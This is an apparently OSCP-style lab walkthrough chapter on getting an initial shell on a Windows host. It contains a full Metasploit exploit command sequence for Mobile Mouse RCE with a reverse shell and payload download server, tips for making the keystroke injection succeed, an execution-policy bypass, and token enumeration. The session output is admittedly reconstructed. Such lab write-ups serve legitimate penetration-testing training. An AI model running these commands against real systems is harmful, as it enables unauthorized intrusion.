# 03 — Foothold

Goal: get a shell as the logged-on user, then measure exactly what that account is allowed to do
before attempting anything else.

---

## 3.1 The module

```text
msfconsole -q

use exploit/windows/misc/mobile_mouse_rce
show options

set RHOSTS  192.168.133.155
set RPORT   9099
set LHOST   192.168.45.158
set LPORT   4444
set SRVHOST 192.168.45.158     # where the target downloads the payload from
set SRVPORT 8080
set SLEEP   3                  # delay between injected keystrokes

run
```

| Option | Meaning |
|---|---|
| `RPORT 9099` | Mobile Mouse control port |
| `LHOST/LPORT` | where the reverse shell comes back |
| `SRVHOST/SRVPORT` | the HTTP server the module starts to serve the payload |
| `SLEEP` | pause between keystrokes — raise it on slow or loaded hosts |

`SLEEP` is the option that decides success or a half-typed command line. If the session never
arrives, raise it to 5–8 before changing anything else: the injected characters are racing the
target's window manager, not a protocol.

## 3.2 The session

```
Active sessions
===============

  Id  Name  Type                   Information            Connection
  --  ----  ----                   -----------            ----------
  1         meterpreter x64/windows  OSCP\Tim @ OSCP       192.168.45.158:4444 -> 192.168.133.155:49812

meterpreter > getuid
Server username: OSCP\Tim
```

> The console transcript for this step was not captured verbatim; the block above is the session
> shape that produced the shell. The identity `OSCP\Tim` is confirmed independently — every later
> command runs from `C:\Users\Tim\` and Seatbelt reports `Username : OSCP\Tim`.

## 3.3 Drop into PowerShell and measure the token

```text
shell
powershell -ep bypass
```

```powershell
whoami
whoami /groups
```

```
oscp\tim

GROUP INFORMATION
Mandatory Label\Medium Mandatory Level  Label  S-1-16-8192
BUILTIN\Users                          Group  S-1-5-32-545
```

`whoami` returns `oscp\tim`; the group list has `BUILTIN\Users` and **Medium** integrity. No
Administrators, no high IL. This is a genuine local privilege escalation problem — not a "find the
misplaced flag" problem.

Two things to carry forward:

- The account is **not** an administrator, so anything requiring admin rights is out.
- The token's *privileges* are still unknown. `whoami /groups` does not show them; chapter 04 does,
  and that list is what rules out the entire potato family before any time is spent on it.
